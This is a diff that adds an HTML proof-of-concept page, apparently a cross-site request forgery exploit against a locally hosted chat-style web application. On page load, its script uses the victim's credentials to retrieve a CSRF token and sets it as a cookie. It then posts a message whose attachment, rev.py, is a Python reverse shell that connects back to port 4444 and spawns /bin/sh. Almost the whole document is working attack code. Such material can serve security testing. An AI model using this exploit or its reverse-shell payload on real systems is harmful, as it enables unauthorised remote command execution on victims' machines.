@@ -1,0 +1,65 @@
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        // First XMLHttpRequest to get the CSRF token
+        var tokenXhr = new XMLHttpRequest();
+        tokenXhr.open("GET", "http:\/\/localhost:50002\/csrf_token", false); // synchronous request
+        tokenXhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
+        tokenXhr.setRequestHeader("Accept", "*\/*");
+        tokenXhr.withCredentials = true;
+        tokenXhr.send({});
+
+        
+        // Parse the token response
+        var tokenData = JSON.parse(tokenXhr.responseText);
+        var csrfToken = tokenData.token;
+        
+        // Set the CSRF token as a cookie to match session["csrf_token"]
+        document.cookie = "csrf_token=" + csrfToken + "; path=/; SameSite=Strict";
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/localhost:50002\/message_async", true);
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundary2vhsFbdS6JottCc9");
+        xhr.setRequestHeader("X-CSRF-Token", csrfToken);
+        xhr.withCredentials = true;
+        var body = "------WebKitFormBoundary2vhsFbdS6JottCc9\r\n" + 
+          "Content-Disposition: form-data; name=\"text\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary2vhsFbdS6JottCc9\r\n" + 
+          "Content-Disposition: form-data; name=\"context\"\r\n" + 
+          "\r\n" + 
+          "4770cda2-faa5-40eb-91be-f45edbec9a34\r\n" + 
+          "------WebKitFormBoundary2vhsFbdS6JottCc9\r\n" + 
+          "Content-Disposition: form-data; name=\"message_id\"\r\n" + 
+          "\r\n" + 
+          "6ce5886d-f55c-4f74-a980-c483ee291349\r\n" + 
+          "------WebKitFormBoundary2vhsFbdS6JottCc9\r\n" + 
+          "Content-Disposition: form-data; name=\"attachments\"; filename=\"rev.py\"\r\n" + 
+          "Content-Type: text/x-python\r\n" + 
+          "\r\n" + 
+          "import socket,os,pty\n" + 
+          "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" + 
+          "s.connect((\"127.0.0.1\",4444))\n" + 
+          "os.dup2(s.fileno(),0)\n" + 
+          "os.dup2(s.fileno(),1)\n" + 
+          "os.dup2(s.fileno(),2)\n" + 
+          "pty.spawn(\"/bin/sh\")\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary2vhsFbdS6JottCc9--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
